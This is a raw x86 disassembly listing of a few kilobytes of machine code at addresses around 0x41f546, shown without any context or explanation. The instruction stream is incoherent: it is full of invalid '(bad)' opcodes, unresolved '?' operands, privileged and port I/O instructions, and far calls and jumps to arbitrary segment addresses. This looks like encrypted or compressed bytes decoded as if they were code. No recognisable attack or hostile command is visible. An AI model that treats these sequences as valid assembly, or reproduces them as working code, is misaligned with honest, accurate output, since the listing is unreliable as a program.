  41f546:	xchg   BYTE PTR [eax],ah
  41f548:	jnp    0x41f551
  41f54a:	call   0xe91a:0xaccfbaba
  41f551:	fild   DWORD PTR [ebx]
  41f553:	or     BYTE PTR [edi+0x3a],0xd7
  41f557:	mov    ds:0x8ab11954,al
  41f55c:	leave  
  41f55d:	mov    edi,ebp
  41f55f:	push   edx
  41f560:	dec    esp
  41f561:	es xchg ebx,eax
  41f563:	adc    al,0x67
  41f565:	xchg   esp,eax
  41f566:	xchg   BYTE PTR ds:0x21cbe5c0,bh
  41f56c:	sub    eax,0x34917b82
  41f571:	pop    ss
  41f572:	icebp  
  41f573:	jns    0x41f523
  41f575:	mov    ah,0x41
  41f577:	(bad)  
  41f578:	xchg   edi,eax
  41f579:	cmp    BYTE PTR [edx+0x6ddb2001],0x74
  41f580:	jnp    0x41f5a3
  41f582:	pop    esi
  41f583:	neg    BYTE PTR [ebx+0x21eb5514]
  41f589:	retf   0xdd07
  41f58c:	and    eax,DWORD PTR [ecx-0x78edaaf8]
  41f592:	int    0x41
  41f594:	in     eax,0xa7
  41f596:	(bad)  
  41f597:	mov    edi,0xcdc56aa3
  41f59c:	push   es
  41f59d:	outs   dx,BYTE PTR ds:[esi]
  41f59e:	add    dl,BYTE PTR [edi-0x108e535e]
  41f5a4:	neg    al
  41f5a6:	mov    ?,WORD PTR [ebx]
  41f5a8:	cmp    DWORD PTR ds:0xca157795,ebp
  41f5ae:	clc    
  41f5af:	mov    ebp,0x2fe5e465
  41f5b4:	pop    esi
  41f5b5:	iret   
  41f5b6:	mov    eax,ds:0x8d42780
  41f5bb:	ror    dl,cl
  41f5bd:	add    BYTE PTR ds:0x3b7fcaf5,bl
  41f5c3:	sbb    BYTE PTR [edx+eax*4],dl
  41f5c6:	add    al,BYTE PTR [esi+0x3d508445]
  41f5cc:	push   edx
  41f5cd:	mov    BYTE PTR [edx],0xae
  41f5d0:	add    al,0x5c
  41f5d2:	cld    
  41f5d3:	cmp    ecx,DWORD PTR ds:0x58f470ba
  41f5d9:	sub    DWORD PTR [ecx+ebx*1],0xd9255296
  41f5e0:	sar    DWORD PTR [ecx+0xb],1
  41f5e3:	(bad)
  41f5e6:	test   BYTE PTR [edi],bh
  41f5e8:	sbb    bh,dl
  41f5ea:	xor    cl,BYTE PTR [ebx-0x28]
  41f5ed:	cmp    eax,0x3a62b488
  41f5f2:	xchg   bp,ax
  41f5f4:	sub    al,0x40
  41f5f6:	add    al,0x96
  41f5f8:	jp     0x41f5d5
  41f5fa:	shl    ah,cl
  41f5fc:	push   ecx
  41f5fd:	out    dx,al
  41f5fe:	cs sbb ebp,0x73
  41f602:	lds    esp,FWORD PTR [edi]
  41f604:	cwde   
  41f605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f606:	adc    ebp,ecx
  41f608:	add    esi,ebp
  41f60a:	dec    esi
  41f60b:	sbb    DWORD PTR [edi+0xcd34402],0x20
  41f612:	adc    BYTE PTR [edx-0x72],0x85
  41f616:	inc    ebp
  41f617:	mov    dl,0x0
  41f619:	sub    eax,0xf8ae18c4
  41f61e:	mov    dh,0x3c
  41f620:	push   cs
  41f621:	aam    0x7b
  41f623:	test   al,0x7b
  41f625:	jecxz  0x41f5aa
  41f627:	mov    eax,0x202c2bc7
  41f62c:	inc    esp
  41f62d:	add    bl,dh
  41f62f:	loopne 0x41f631
  41f631:	mov    al,ds:0x3493524
  41f636:	test   BYTE PTR [esi-0x70882f77],bl
  41f63c:	fs and eax,0x22b873e7
  41f642:	pop    ebp
  41f643:	icebp  
  41f644:	les    edi,FWORD PTR [edi+0x5c12d787]
  41f64a:	or     al,0x4b
  41f64c:	mov    ch,0x93
  41f64e:	out    dx,eax
  41f64f:	xchg   esp,eax
  41f650:	icebp  
  41f651:	add    ebp,DWORD PTR [ebx+0x27]
  41f654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f655:	cli    
  41f656:	pop    edx
  41f657:	mov    al,BYTE PTR [edx+ebp*8-0x33]
  41f65b:	jo     0x41f600
  41f65d:	pop    ebp
  41f65e:	stos   DWORD PTR es:[edi],eax
  41f65f:	aad    0xec
  41f661:	imul   eax,ebx,0xffffff88
  41f664:	add    DWORD PTR es:[edx+0x12],edx
  41f668:	and    dh,dh
  41f66a:	pop    ss
  41f66b:	cmp    al,BYTE PTR ds:0x18985796
  41f671:	aas    
  41f672:	rol    dl,0x7f
  41f675:	aas    
  41f676:	repnz push ecx
  41f678:	in     al,0xaf
  41f67a:	rdtsc  
  41f67c:	cs xor eax,0x32f4386f
  41f682:	sub    ebx,ebp
  41f684:	mov    ds:0xaad650c2,eax
  41f689:	dec    esi
  41f68a:	sbb    al,0xcc
  41f68c:	and    ah,BYTE PTR [ebx]
  41f68e:	mov    bl,0x91
  41f690:	mov    dl,0x32
  41f692:	inc    ebx
  41f693:	jmp    0x6e25a8d1
  41f698:	aam    0x75
  41f69a:	fwait
  41f69b:	mov    cl,0x7b
  41f69d:	clc    
  41f69e:	push   0x3d
  41f6a0:	retf   
  41f6a1:	or     esp,DWORD PTR [ecx+0xef6d9c1]
  41f6a7:	hlt    
  41f6a8:	or     eax,edx
  41f6aa:	popa   
  41f6ab:	stc    
  41f6ac:	test   DWORD PTR [ebx+0x3290af86],esp
  41f6b2:	bnd jmp DWORD PTR [eax+0x5e61f259]
  41f6b9:	xor    edi,edx
  41f6bb:	sub    ebx,esp
  41f6bd:	and    ecx,DWORD PTR [edi-0x76]
  41f6c0:	push   cs
  41f6c1:	(bad)  
  41f6c2:	xor    DWORD PTR [esi],ebp
  41f6c4:	fadd   DWORD PTR [edx]
  41f6c6:	sub    BYTE PTR [eax-0x4c],ah
  41f6c9:	or     al,0x88
  41f6cb:	hlt    
  41f6cc:	xchg   edx,eax
  41f6cd:	push   ds
  41f6ce:	pop    edx
  41f6cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6d0:	fisttp DWORD PTR [ecx+0xb]
  41f6d3:	pop    esi
  41f6d4:	jge    0x41f72e
  41f6d6:	fnstcw WORD PTR [edx]
  41f6d8:	in     al,0xc3
  41f6da:	in     al,0x14
  41f6dc:	cld    
  41f6dd:	cmp    ecx,DWORD PTR [ebp+0x71]
  41f6e0:	in     eax,dx
  41f6e1:	(bad)  
  41f6e2:	sub    eax,0x5839756a
  41f6e7:	jg     0x41f690
  41f6e9:	dec    ebp
  41f6ea:	and    ch,bh
  41f6ec:	push   ebp
  41f6ed:	push   esi
  41f6ee:	ret    0x92fb
  41f6f1:	les    ebp,FWORD PTR [edi+0x4bffddde]
  41f6f7:	sar    BYTE PTR [edi+ebx*1+0x6682a22],0x16
  41f6ff:	xor    DWORD PTR [edx+0x53823bdb],esp
  41f705:	pop    edx
  41f706:	shr    ebp,0x8a
  41f709:	rol    BYTE PTR [ecx],0xa0
  41f70c:	dec    eax
  41f70d:	js     0x41f700
  41f70f:	or     ch,BYTE PTR [edi+0x452fc1ec]
  41f715:	xchg   edi,eax
  41f716:	jae    0x41f771
  41f718:	div    ebx
  41f71a:	hlt    
  41f71b:	dec    esp
  41f71c:	stos   BYTE PTR es:[edi],al
  41f71d:	das    
  41f71e:	push   ebp
  41f71f:	adc    BYTE PTR [ecx],dh
  41f721:	sbb    eax,0x56108238
  41f726:	in     eax,dx
  41f727:	ss mov bh,0xa5
  41f72a:	sar    BYTE PTR [edi-0x5f],cl
  41f72d:	pop    esi
  41f72e:	loop   0x41f6c0
  41f730:	mov    ch,0x84
  41f732:	push   ebp
  41f733:	mov    al,ds:0xb703c858
  41f738:	repz push esp
  41f73a:	out    dx,al
  41f73b:	cmp    ebx,edi
  41f73d:	aam    0xbc
  41f73f:	pop    es
  41f740:	xchg   edi,eax
  41f741:	add    eax,eax
  41f743:	les    esp,FWORD PTR [ebp+0x151069cb]
  41f749:	rcl    BYTE PTR [ebp-0x11],cl
  41f74c:	fmul   QWORD PTR [edi+0x6c]
  41f74f:	dec    ebx
  41f750:	cdq    
  41f751:	and    esp,DWORD PTR [ebx+0x1d]
  41f754:	pop    esi
  41f755:	nop
  41f756:	into   
  41f757:	lea    esp,[ecx-0x3b16688f]
  41f75d:	fisubr DWORD PTR [edx-0x64]
  41f760:	mov    edi,0xf9b35748
  41f765:	and    esp,edx
  41f767:	push   0x1b
  41f769:	nop
  41f76a:	cmc    
  41f76b:	and    dl,BYTE PTR [edx+0x472b9847]
  41f771:	arpl   WORD PTR [esi],di
  41f773:	sar    BYTE PTR [esi+0x50ea5223],1
  41f779:	dec    esp
  41f77a:	jecxz  0x41f741
  41f77c:	sbb    al,cl
  41f77e:	adc    eax,0x2fba2471
  41f783:	mov    al,0xa
  41f785:	dec    edi
  41f786:	and    BYTE PTR [ecx+eax*1-0x59],bh
  41f78a:	xchg   ebp,eax
  41f78b:	sar    BYTE PTR [ebx+0x4f1d3d3a],1
  41f791:	mov    eax,ds:0x4c61cdf7
  41f796:	call   0xb986:0x9a445f3d
  41f79d:	adc    eax,0x7a68491a
  41f7a2:	jae    0x41f7ed
  41f7a4:	loop   0x41f7d1
  41f7a6:	mov    ch,0xb1
  41f7a8:	pop    es
  41f7a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7aa:	lods   eax,DWORD PTR ds:[esi]
  41f7ab:	sbb    al,0x78
  41f7ad:	sbb    cl,BYTE PTR [ebx]
  41f7af:	add    ah,BYTE PTR [ecx+0x1d]
  41f7b2:	jmp    0x2f45:0x136507d6
  41f7b9:	cmc    
  41f7ba:	pop    edi
  41f7bb:	aam    0x6b
  41f7bd:	ins    DWORD PTR es:[edi],dx
  41f7be:	sbb    eax,DWORD PTR [ecx]
  41f7c0:	leave  
  41f7c1:	je     0x41f7ff
  41f7c3:	stos   BYTE PTR es:[edi],al
  41f7c4:	retf   0x8bc4
  41f7c7:	mov    ebp,0xd29f8a77
  41f7cc:	jle    0x41f805
  41f7ce:	pop    esi
  41f7cf:	inc    eax
  41f7d0:	cmc    
  41f7d1:	sub    eax,0x84d4e62d
  41f7d6:	lds    ecx,FWORD PTR [ecx-0x254b27e9]
  41f7dc:	xlat   BYTE PTR ds:[ebx]
  41f7dd:	or     BYTE PTR [esi],0x80
  41f7e0:	fldcw  WORD PTR ds:0xa589ade0
  41f7e6:	cld    
  41f7e7:	sbb    ebx,esi
  41f7e9:	adc    BYTE PTR [ecx+0x27],ch
  41f7ec:	sti    
  41f7ed:	jns    0x41f80d
  41f7ef:	ret    0x2799
  41f7f2:	aas    
  41f7f3:	mov    al,0xb2
  41f7f5:	inc    ebp
  41f7f6:	push   es
  41f7f7:	and    edi,DWORD PTR [edi-0x37]
  41f7fa:	mov    eax,ds:0x8b695345
  41f7ff:	jmp    0x4ffd:0xd60f9730
  41f806:	rcr    bl,cl
  41f808:	fsub   DWORD PTR [ecx-0x3f62826c]
  41f80e:	in     al,0xff
  41f810:	fistp  QWORD PTR [ecx+eiz*2]
  41f813:	test   al,0xae
  41f815:	and    al,0xc0
  41f817:	sub    DWORD PTR cs:[eax],ebx
  41f81a:	mov    edx,DWORD PTR [edx+0x703c8e11]
  41f820:	pcmpeqb mm5,QWORD PTR [eax]
  41f823:	fsubr  DWORD PTR [edx]
  41f825:	sti    
  41f826:	mov    edi,?
  41f828:	out    dx,al
  41f829:	sbb    DWORD PTR [esi],edi
  41f82b:	jno    0x41f894
  41f82d:	sahf   
  41f82e:	enter  0x69a8,0x7c
  41f832:	pop    eax
  41f833:	das    
  41f834:	and    eax,ecx
  41f836:	sbb    BYTE PTR [edx-0x55],dl
  41f839:	mov    eax,ecx
  41f83b:	(bad)  
  41f83c:	jge    0x41f81f
  41f83e:	daa    
  41f83f:	popf   
  41f840:	outs   dx,BYTE PTR ds:[esi]
  41f841:	rcl    DWORD PTR [ecx-0x50],1
  41f844:	aaa    
  41f845:	xchg   DWORD PTR [ecx],esi
  41f847:	loop   0x41f82c
  41f849:	(bad)  
  41f84b:	stc    
  41f84c:	push   eax
  41f84d:	fldenv [ebp+0x65ca4b78]
  41f853:	cld    
  41f854:	gs ret 0xb6ba
  41f858:	call   0x926920a
  41f85d:	mov    BYTE PTR [ebx-0x2a],cl
  41f860:	(bad)  [edi-0x70]
  41f863:	lods   al,BYTE PTR ds:[esi]
  41f864:	push   0x96c5add1
  41f869:	sbb    edx,DWORD PTR [esi]
  41f86b:	xchg   ebp,eax
  41f86c:	sbb    eax,0x64c1811a
  41f871:	and    BYTE PTR [esi-0x22c336f0],cl
  41f877:	add    bh,bh
  41f879:	or     al,0xbd
  41f87b:	or     al,dh
  41f87d:	scas   eax,DWORD PTR es:[edi]
  41f87e:	or     DWORD PTR [edi-0x61],eax
  41f881:	sbb    eax,0x6ade8c20
  41f886:	(bad)  
  41f887:	and    ebx,ebp
  41f889:	ins    DWORD PTR es:[edi],dx
  41f88a:	loope  0x41f8da
  41f88c:	(bad)  
  41f88e:	xchg   ebx,eax
  41f88f:	sbb    ecx,DWORD PTR [edi]
  41f891:	mov    ah,0x22
  41f893:	add    dh,BYTE PTR [ecx+0x42]
  41f896:	pop    es
  41f897:	push   edx
  41f898:	mov    edx,0xcf9612e0
  41f89d:	sbb    eax,0x68d16a95
  41f8a2:	pop    esi
  41f8a3:	aas    
  41f8a4:	loope  0x41f8f0
  41f8a6:	push   eax
  41f8a7:	fwait
  41f8a8:	inc    edx
  41f8a9:	bound  esi,QWORD PTR [esi+0x6a]
  41f8ac:	xchg   esi,eax
  41f8ad:	shl    BYTE PTR [ecx-0x65335564],1
  41f8b3:	ins    BYTE PTR es:[edi],dx
  41f8b4:	arpl   WORD PTR [edx+ebp*8-0xd788953],ax
  41f8bb:	pop    ebp
  41f8bc:	sbb    al,BYTE PTR [edi+eiz*4]
  41f8bf:	icebp  
  41f8c0:	xchg   ecx,eax
  41f8c1:	push   ebx
  41f8c2:	sub    eax,0xcc7b597a
  41f8c7:	inc    ebp
  41f8c8:	mov    bl,0xf3
  41f8ca:	cmp    esp,DWORD PTR [edi]
  41f8cc:	adc    BYTE PTR [edi+edi*2+0x155995f8],0xdf
  41f8d4:	pop    edx
  41f8d5:	mov    esp,0x27fc2248
  41f8da:	sbb    dl,BYTE PTR [edi+0x4f9e2793]
  41f8e0:	dec    ebp
  41f8e1:	jmp    0xea72d3bd
  41f8e6:	jne    0x41f967
  41f8e8:	and    bh,BYTE PTR [edi]
  41f8ea:	sub    ah,BYTE PTR [ebx-0x56eeb299]
  41f8f0:	retf   
  41f8f1:	rcr    DWORD PTR [edx+0x2c],1
  41f8f4:	pop    edx
  41f8f5:	ins    DWORD PTR es:[edi],dx
  41f8f6:	inc    ecx
  41f8f7:	into   
  41f8f8:	out    dx,al
  41f8f9:	popa   
  41f8fa:	icebp  
  41f8fb:	adc    al,0xde
  41f8fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8fe:	mov    dh,0xe2
  41f900:	fistp  QWORD PTR [edi]
  41f902:	mov    ebx,0xad47968c
  41f907:	xchg   esi,eax
  41f908:	sub    edx,ecx
  41f90a:	add    al,0xaf
  41f90c:	mov    eax,ds:0xf87ec201
  41f911:	sub    BYTE PTR [ebx],ch
  41f913:	das    
  41f914:	fiadd  DWORD PTR [ecx+0x26]
  41f917:	add    eax,0xf71be68c
  41f91c:	pop    esi
  41f91d:	popw   es
  41f91f:	test   al,0xb9
  41f921:	daa    
  41f922:	mov    eax,0x9c55463e
  41f927:	enter  0xc2bd,0x6c
  41f92b:	xor    bh,ah
  41f92d:	shl    BYTE PTR [esi+0x6a],1
  41f930:	xor    DWORD PTR [eax-0x7a],ebp
  41f933:	mov    esi,0x87f68a3f
  41f938:	in     al,dx
  41f939:	add    al,0x91
  41f93b:	jbe    0x41f937
  41f93d:	xchg   edx,eax
  41f93e:	and    dl,BYTE PTR [esi+0x3fe1fe91]
  41f944:	xor    DWORD PTR [ebx+0x36],esp
  41f947:	shr    DWORD PTR [edx+0x73],1
  41f94a:	or     al,0x5d
  41f94c:	sub    BYTE PTR [ecx+0x62],0xae
  41f950:	idiv   BYTE PTR [esi-0x15]
  41f953:	xor    eax,ebx
  41f955:	and    ah,BYTE PTR [bp+di]
  41f958:	cmp    al,0x6b
  41f95a:	adc    al,0x29
  41f95c:	rep stos BYTE PTR es:[edi],al
  41f95e:	popa   
  41f95f:	fistp  WORD PTR [esi+edx*4]
  41f962:	pop    eax
  41f964:	add    dh,BYTE PTR [ebx+0x6a]
  41f967:	push   ebx
  41f968:	aas    
  41f969:	out    dx,al
  41f96a:	(bad)  [ebp+0x4f]
  41f96d:	mov    DWORD PTR [edx-0x1648deb2],esi
  41f973:	mov    al,0x2d
  41f975:	cmp    esp,DWORD PTR [edi-0x6bf41906]
  41f97b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f97c:	mul    ah
  41f97e:	sbb    al,0xa2
  41f980:	pop    esp
  41f981:	cmp    DWORD PTR [edx+0x30],esp
  41f984:	dec    ebp
  41f985:	push   ds
  41f986:	ret    0x864e
  41f989:	std    
  41f98a:	pusha  
  41f98b:	jp     0x41f9e2
  41f98d:	inc    edx
  41f98e:	cli    
  41f98f:	js     0x41f9da
  41f991:	xor    DWORD PTR [edx-0x148914a8],ecx
  41f997:	popf   
  41f998:	jmp    0x41f933
  41f99a:	mov    cl,0xab
  41f99c:	pushf  
  41f99d:	push   esi
  41f99e:	stos   BYTE PTR es:[edi],al
  41f99f:	and    esi,DWORD PTR [eax-0x524eec9]
  41f9a5:	xor    eax,0x613125d
  41f9aa:	push   ss
  41f9ab:	outs   dx,BYTE PTR ds:[esi]
  41f9ac:	mov    cl,0xd2
  41f9ae:	mov    ecx,0x14007ae0
  41f9b3:	aad    0x96
  41f9b5:	popf   
  41f9b6:	xor    al,cl
  41f9b8:	adc    esi,DWORD PTR [ecx+0x75]
  41f9bb:	ins    DWORD PTR es:[edi],dx
  41f9bc:	cli    
  41f9bd:	popa   
  41f9be:	and    ch,ah
  41f9c0:	mov    eax,ds:0xe403bc4d
  41f9c5:	fwait
  41f9c6:	cwde   
  41f9c7:	dec    eax
  41f9c8:	jno    0x41f955
  41f9ca:	xchg   ecx,eax
  41f9cb:	inc    ecx
  41f9cc:	dec    ebp
  41f9cd:	cmp    al,0xa6
  41f9cf:	ficomp WORD PTR [eax-0x58b980f9]
  41f9d5:	xor    BYTE PTR [edx-0xe009488],ch
  41f9db:	and    dl,dh
  41f9dd:	cmp    eax,0xc557fbda
  41f9e2:	loop   0x41f992
  41f9e4:	popf   
  41f9e5:	test   al,0x57
  41f9e7:	fcomi  st,st(3)
  41f9e9:	mov    BYTE PTR es:[edx+0x5c],bl
  41f9ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9ee:	add    DWORD PTR [esi],esi
  41f9f0:	inc    edi
  41f9f1:	fdivp  st(5),st
  41f9f3:	psrad  mm7,mm1
  41f9f6:	or     eax,0xce3ccda8
  41f9fb:	jb     0x41fa46
  41f9fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9fe:	div    BYTE PTR [edx-0x4edd3a65]
  41fa04:	loop   0x41f9c2
  41fa06:	mov    esi,?
  41fa08:	pop    ecx
  41fa09:	or     eax,0x14232316
  41fa0e:	lock dec edx
  41fa10:	sub    eax,0x295cda86
  41fa15:	or     DWORD PTR [ebp+0x5e],ebx
  41fa18:	fdiv   QWORD PTR [ebp+0x78]
  41fa1b:	cmp    eax,0x78328b6a
  41fa20:	and    BYTE PTR [ebp+0x20],ch
  41fa23:	dec    edi
  41fa24:	adc    BYTE PTR ds:0xd9a5688d,bl
  41fa2a:	cmp    ecx,DWORD PTR [edx+0x5f12b62]
  41fa30:	add    ch,0xb3
  41fa33:	fidivr WORD PTR [edx+0x45]
  41fa36:	scas   eax,DWORD PTR es:[edi]
  41fa37:	clc    
  41fa38:	mov    fs,WORD PTR [ecx]
  41fa3a:	ins    DWORD PTR es:[edi],dx
  41fa3b:	push   eax
  41fa3c:	jg     0x41faaa
  41fa3e:	data16 aad 0x4f
  41fa41:	dec    edx
  41fa42:	das    
  41fa43:	mov    bl,0xab
  41fa45:	fcomp  QWORD PTR [ebx+0x37168d90]
  41fa4b:	or     eax,0x3fd3b621
  41fa50:	sub    eax,0x17549f71
  41fa55:	jne    0x41fa2a
  41fa57:	clc    
  41fa58:	sahf   
  41fa59:	push   ss
  41fa5a:	mov    eax,ds:0x6ff2e796
  41fa5f:	dec    ebx
  41fa60:	in     al,0x21
  41fa62:	xchg   ebp,eax
  41fa63:	leave  
  41fa64:	jmp    0x63d5f8c3
  41fa69:	xor    eax,0xbbd365e5
  41fa6e:	popa   
  41fa6f:	inc    edx
  41fa70:	jl     0x41fa7f
  41fa72:	xchg   edx,eax
  41fa73:	inc    esp
  41fa74:	push   cs
  41fa75:	cmc    
  41fa76:	and    edx,DWORD PTR [edx]
  41fa78:	xchg   edi,eax
  41fa79:	loope  0x41fa52
  41fa7b:	mov    al,ds:0x131b9b51
  41fa80:	je     0x41facc
  41fa82:	js     0x41fa13
  41fa84:	sub    bh,BYTE PTR [edi+0x39]
  41fa87:	pushf  
  41fa88:	sub    BYTE PTR [eax+0x36565211],0xa8
  41fa8f:	dec    esp
  41fa90:	(bad)  
  41fa91:	push   ebp
  41fa92:	fstp   DWORD PTR [ebx+edx*1+0x2a00cae5]
  41fa99:	jno    0x41fa5a
  41fa9b:	aam    0x31
  41fa9d:	push   edx
  41fa9e:	dec    esp
  41fa9f:	in     al,dx
  41faa0:	mov    al,gs:0x5e2279a7
  41faa6:	repz cmp bl,BYTE PTR [edx]
  41faa9:	cmp    ah,BYTE PTR [ecx]
  41faab:	mov    bh,0x12
  41faad:	std    
  41faae:	fld    TBYTE PTR [edx+0x566df86]
  41fab4:	inc    esp
  41fab5:	pop    es
  41fab6:	(bad)  
  41fab7:	pop    edx
  41fab8:	xchg   BYTE PTR [edi+0x29ceae15],cl
  41fabe:	mov    ss,esi
  41fac0:	test   ebx,0xa3d277f0
  41fac6:	pop    edx
  41fac7:	mov    eax,ds:0x66e8b94c
  41facc:	outs   dx,DWORD PTR ds:[esi]
  41facd:	mov    dh,0x63
  41facf:	ror    DWORD PTR [ebp+ebp*8+0x7f],cl
  41fad3:	cmc    
  41fad4:	inc    cl
  41fad6:	xchg   ebx,eax
  41fad7:	je     0x41fa93
  41fad9:	add    al,0xc5
  41fadb:	push   es
  41fadc:	sbb    eax,0xd390d39f
  41fae1:	iret   
  41fae2:	test   al,0xe8
  41fae4:	mov    ah,bl
  41fae6:	lock pushf 
  41fae8:	fwait
  41fae9:	and    eax,0x1581fc0a
  41faee:	and    al,0x6d
  41faf0:	adc    esp,DWORD PTR [eax]
  41faf2:	aas    
  41faf3:	pusha  
  41faf4:	out    0x85,eax
  41faf6:	mov    edi,?
  41faf8:	jmp    0xd2ee:0x89888e3
  41faff:	dec    eax
  41fb00:	xor    BYTE PTR [esp-0x6b],ch
  41fb04:	and    DWORD PTR [ebp+0x67b727b6],esi
  41fb0a:	dec    eax
  41fb0b:	push   esp
  41fb0c:	(bad)  ds:0x66bd4052
  41fb12:	mov    ds:0xf5ac4285,eax
  41fb17:	mov    ch,BYTE PTR [edi+0x24]
  41fb1a:	cwde   
  41fb1b:	aad    0xaf
  41fb1d:	sub    ebx,DWORD PTR [eax+0x51084119]
  41fb23:	inc    eax
  41fb24:	rcl    DWORD PTR [edx+eax*1-0x49],cl
  41fb28:	fcmove st,st(0)
  41fb2a:	sar    ah,cl
  41fb2c:	cwde   
  41fb2d:	xor    DWORD PTR [ecx+esi*4+0x7ed85aee],eax
  41fb34:	lods   al,BYTE PTR ds:[esi]
  41fb35:	adc    BYTE PTR [ecx+ebp*2+0x4],al
  41fb39:	sbb    DWORD PTR [ebp-0x14],eax
  41fb3c:	js     0x41fafc
  41fb3e:	call   0x2e978d6
  41fb43:	int3   
  41fb44:	xor    DWORD PTR [esi],edi
  41fb46:	(bad)  
  41fb47:	push   ds
  41fb48:	out    dx,al
  41fb49:	xor    cl,BYTE PTR [ebx+0x24]
  41fb4c:	sbb    BYTE PTR [eax+0x6],cl
  41fb4f:	push   ebx
  41fb50:	jbe    0x41fbcb
  41fb52:	and    edi,edi
  41fb54:	sub    ebx,DWORD PTR [ebp-0x318443cd]
  41fb5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb5b:	xor    ah,BYTE PTR [ebx]
  41fb5d:	int3   
  41fb5e:	mov    al,0xce
  41fb60:	push   ecx
  41fb61:	push   esi
  41fb62:	push   cs
  41fb63:	mov    ah,0x51
  41fb65:	mov    BYTE PTR [ecx+0x45350c87],bl
  41fb6b:	loope  0x41fb13
  41fb6d:	xchg   esp,eax
  41fb6e:	inc    eax
  41fb6f:	and    DWORD PTR [ecx+0x285ad6b6],ecx
  41fb75:	test   eax,0xf9be1795
  41fb7a:	(bad)  
  41fb7b:	call   0xa336:0xa8d6ae51
  41fb82:	js     0x41fbe8
  41fb84:	rcl    BYTE PTR [edx+0x45],0x1c
  41fb88:	xor    eax,0xda4e3c51
  41fb8d:	loop   0x41fbcf
  41fb8f:	(bad)  
  41fb90:	test   BYTE PTR [ebx+0x3f],bl
  41fb93:	add    al,0xb5
  41fb95:	js     0x41fb6e
  41fb97:	das    
  41fb98:	mov    esi,0x415b49ed
  41fb9d:	lods   eax,DWORD PTR ds:[esi]
  41fb9e:	inc    ebx
  41fb9f:	xchg   ebp,eax
  41fba0:	fcomp  QWORD PTR [eax]
  41fba2:	fwait
  41fba3:	inc    esi
  41fba4:	jno    0x41fc19
  41fba6:	ja     0x41fc10
  41fba8:	mov    ch,0x6a
  41fbaa:	pop    ebx
  41fbab:	cmp    eax,0xf0f4f3b5
  41fbb0:	in     al,0x4d
  41fbb2:	cmp    DWORD PTR [ebp+0x59],ecx
  41fbb5:	inc    ebx
  41fbb6:	pop    ss
  41fbb7:	mov    BYTE PTR ds:0x1a770d35,cl
  41fbbd:	mov    eax,0xcf8f9882
  41fbc2:	or     DWORD PTR [eax],edx
  41fbc4:	cmp    al,0x73
  41fbc6:	or     al,BYTE PTR [edx+0x56]
  41fbc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbca:	jb     0x41fb9d
  41fbcc:	or     eax,0x1a30f76b
  41fbd1:	dec    ecx
  41fbd2:	int3   
  41fbd3:	add    esp,ebp
  41fbd5:	rcr    DWORD PTR [ebp+0x0],1
  41fbd8:	jnp    0x41fc38
  41fbda:	imul   ebp,DWORD PTR [eax+0x34bccfcb],0xffffffd2
  41fbe1:	std    
  41fbe2:	mov    WORD PTR [edi+0x22],?
  41fbe5:	pop    ss
  41fbe6:	imul   esp,DWORD PTR [ebx+0x63dca7aa],0xffffffb5
  41fbed:	out    0xac,eax
  41fbef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbf0:	add    esp,0xffffffb3
  41fbf3:	dec    esp
  41fbf4:	dec    esi
  41fbf5:	sbb    cl,dl
  41fbf7:	fcomp  DWORD PTR [edi]
  41fbf9:	cdq    
  41fbfa:	rcl    BYTE PTR [ebp+0x4724a692],cl
  41fc00:	adc    DWORD PTR [ebx-0x3b],ecx
  41fc03:	mov    al,ds:0x89731fa6
  41fc08:	mov    al,0xdd
  41fc0a:	xchg   esp,eax
  41fc0b:	lock mov ecx,DWORD PTR [ebx-0x2b]
  41fc0f:	out    0xbe,al
  41fc11:	and    BYTE PTR gs:[esp+edx*1],dh
  41fc15:	cmp    DWORD PTR [edx+ebx*4-0x5c],0xffffff80
  41fc1a:	inc    edx
  41fc1b:	into   
  41fc1c:	daa    
  41fc1d:	ret    
  41fc1e:	(bad)  
  41fc1f:	cld    
  41fc20:	mov    al,ds:0x9b4684b4
  41fc25:	gs leave 
  41fc27:	push   eax
  41fc28:	leave  
  41fc29:	and    eax,ebx
  41fc2b:	fisttp WORD PTR [edi+eax*4+0xb]
  41fc2f:	pop    eax
  41fc30:	mov    BYTE PTR [ebx],cl
  41fc32:	xchg   esp,eax
  41fc33:	mov    dh,ch
  41fc35:	sti    
  41fc36:	xchg   esi,eax
  41fc37:	mov    ch,0xf6
  41fc39:	add    eax,0xc58b8fd9
  41fc3e:	in     al,dx
  41fc3f:	jp     0x41fc11
  41fc41:	push   ecx
  41fc42:	jge    0x41fc61
  41fc44:	add    DWORD PTR [ebx],0x8ebd351b
  41fc4a:	aaa    
  41fc4b:	sbb    edx,DWORD PTR [ebp+0x7de9130d]
  41fc51:	dec    ebp
  41fc52:	ds aaa 
  41fc54:	xor    DWORD PTR [ecx],esi
  41fc56:	scas   al,BYTE PTR es:[edi]
  41fc57:	je     0x41fc14
  41fc59:	mov    eax,ds:0x8ff8242d
  41fc5e:	xchg   edi,eax
  41fc5f:	inc    ecx
  41fc60:	pop    ebp
  41fc61:	push   esi
  41fc62:	aam    0x96
  41fc64:	mov    ds:0x995f1d15,al
  41fc69:	ds ss and BYTE PTR ss:[eax+0x2f],bl
  41fc6f:	pop    esi
  41fc70:	xor    BYTE PTR [edi+0x79],dh
  41fc73:	stos   BYTE PTR es:[edi],al
  41fc74:	(bad)  
  41fc77:	inc    ebp
  41fc78:	cmp    bl,BYTE PTR ds:0xad4eb777
  41fc7e:	jmp    0x7b2dabd0
  41fc83:	mov    cl,0xac
  41fc85:	stc    
  41fc86:	mul    BYTE PTR [edi]
  41fc88:	pop    esp
  41fc89:	out    dx,al
  41fc8a:	sahf   
  41fc8b:	addr16 jle 0x41fc5f
  41fc8e:	cmp    al,0xe9
  41fc90:	out    dx,eax
  41fc91:	push   edi
  41fc92:	sub    esp,DWORD PTR [ecx+eax*4]
  41fc95:	bound  ebx,QWORD PTR [edi-0x271ef498]
  41fc9b:	imul   edi,edx,0xd
  41fc9e:	pusha  
